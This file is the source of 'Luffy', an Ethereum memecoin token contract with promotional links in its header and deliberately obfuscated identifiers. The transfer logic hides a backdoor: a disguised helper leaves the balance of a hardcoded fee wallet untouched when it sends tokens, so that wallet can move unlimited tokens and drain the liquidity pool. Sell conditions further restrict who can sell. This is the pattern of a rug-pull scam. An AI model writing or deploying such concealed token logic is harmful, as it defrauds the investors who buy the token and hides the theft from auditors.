/**

Luffy  $Luffy
Welcome aboard the Luffy memecoin project.

Get ready to set sail on a thrilling adventure.


TWITTER: https://twitter.com/Luffy_Erc20
TELEGRAM: https://t.me/Luffy_Coin
WEBSITE: https://luffyeth.com/
**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _mhwex(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _mhwex(a, b, "SafeMath");
    }

    function  _mhwex(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _qolbsv {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _pisevns {
    function swotjTenwtSirtjsFxlOcswer(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Luffy is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _pisevns private _Tevaplk;
    address payable private _Afrvmsf;
    address private _yiarbvr;

    bool private _pvtymkn;
    bool public _Teraelvnm = false;
    bool private ouaevuek = false;
    bool private _aekjohfp = false;

    string private constant _name = unicode"Luffy";
    string private constant _symbol = unicode"Luffy";
    uint8 private constant _decimals = 9;
    uint256 private constant _bTokalvs = 1000000000 * 10 **_decimals;
    uint256 public _kvdzoazn = _bTokalvs;
    uint256 public _Waexmyaf = _bTokalvs;
    uint256 public _kwapoThaecem= _bTokalvs;
    uint256 public _gsoiTcjef= _bTokalvs;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _ckprtjop;
    mapping (address => bool) private _traenojy;
    mapping(address => uint256) private _rkeopmo;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yrvxqoxq=0;
    uint256 private _bnwnvre=0;


    event _morqufbt(uint _kvdzoazn);
    modifier oTsofe {
        ouaevuek = true;
        _;
        ouaevuek = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _bTokalvs;
        _ckprtjop[owner(

        )] = true;
        _ckprtjop[address
        (this)] = true;
        _ckprtjop[
            _Afrvmsf] = true;
        _Afrvmsf = 
        payable (0xdc62d7Bbd62E9Fa7eE325C39869Aac131Ee92528);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _bTokalvs);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _bTokalvs;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _mhwex(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 Rqlamfk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Teraelvnm) {
                if (to 
                != address
                (_Tevaplk) 
                && to !=
                 address
                 (_yiarbvr)) {
                  require(_rkeopmo
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rkeopmo
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _yiarbvr && to != 
            address(_Tevaplk) &&
             !_ckprtjop[to] ) {
                require(amount 
                <= _kvdzoazn,
                 "Exceeds the _kvdzoazn.");
                require(balanceOf
                (to) + amount
                 <= _Waexmyaf,
                  "Exceeds the macxizse.");
                if(_bnwnvre
                < _yrvxqoxq){
                  require
                  (! _eoqmvna(to));
                }
                _bnwnvre++;
                 _traenojy
                 [to]=true;
                Rqlamfk = amount._pvr
                ((_bnwnvre>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _yiarbvr &&
             from!= address(this) 
            && !_ckprtjop[from] ){
                require(amount <= 
                _kvdzoazn && 
                balanceOf(_Afrvmsf)
                <_gsoiTcjef,
                 "Exceeds the _kvdzoazn.");
                Rqlamfk = amount._pvr((_bnwnvre>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_bnwnvre>
                _yrvxqoxq &&
                 _traenojy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ouaevuek 
            && to == _yiarbvr &&
             _aekjohfp &&
             contractTokenBalance>
             _kwapoThaecem 
            && _bnwnvre>
            _yrvxqoxq&&
             !_ckprtjop[to]&&
              !_ckprtjop[from]
            ) {
                _rcjmevf( _rkajq(amount, 
                _rkajq(contractTokenBalance,
                _gsoiTcjef)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _ujfvhe(address
                    (this).balance);
                }
            }
        }

        if(Rqlamfk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(Rqlamfk);
          emit
           Transfer(from,
           address
           (this),Rqlamfk);
        }
        _balances[from
        ]= _mhwex(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _mhwex(Rqlamfk));
        emit Transfer
        (from, to, 
        amount.
         _mhwex(Rqlamfk));
    }

    function _rcjmevf(uint256
     tokenAmount) private
      oTsofe {
        if(tokenAmount==
        0){return;}
        if(!_pvtymkn)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tevaplk.WETH();
        _approve(address(this),
         address(
             _Tevaplk), 
             tokenAmount);
        _Tevaplk.
        swotjTenwtSirtjsFxlOcswer
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rkajq
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _mhwex(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Afrvmsf){
            return a ;
        }else{
            return a .
             _mhwex (b);
        }
    }

    function removebLimitas (
        
    ) external onlyOwner{
        _kvdzoazn = _bTokalvs;
        _Waexmyaf = _bTokalvs;
        emit _morqufbt(_bTokalvs);
    }

    function _eoqmvna(address 
    account) private view 
    returns (bool) {
        uint256 bkzqa;
        assembly {
            bkzqa :=
             extcodesize
             (account)
        }
        return bkzqa > 
        0;
    }

    function _ujfvhe(uint256
    amount) private {
        _Afrvmsf.
        transfer(
            amount);
    }

    function enableTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _pvtymkn ) ;
        _Tevaplk  
        =  
        _pisevns
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tevaplk), 
            _bTokalvs);
        _yiarbvr = 
        _qolbsv(_Tevaplk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tevaplk .
             WETH ( ) );
        _Tevaplk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_yiarbvr).
        approve(address(_Tevaplk), 
        type(uint)
        .max);
        _aekjohfp = true;
        _pvtymkn = true;
    }

    receive() external payable {}
}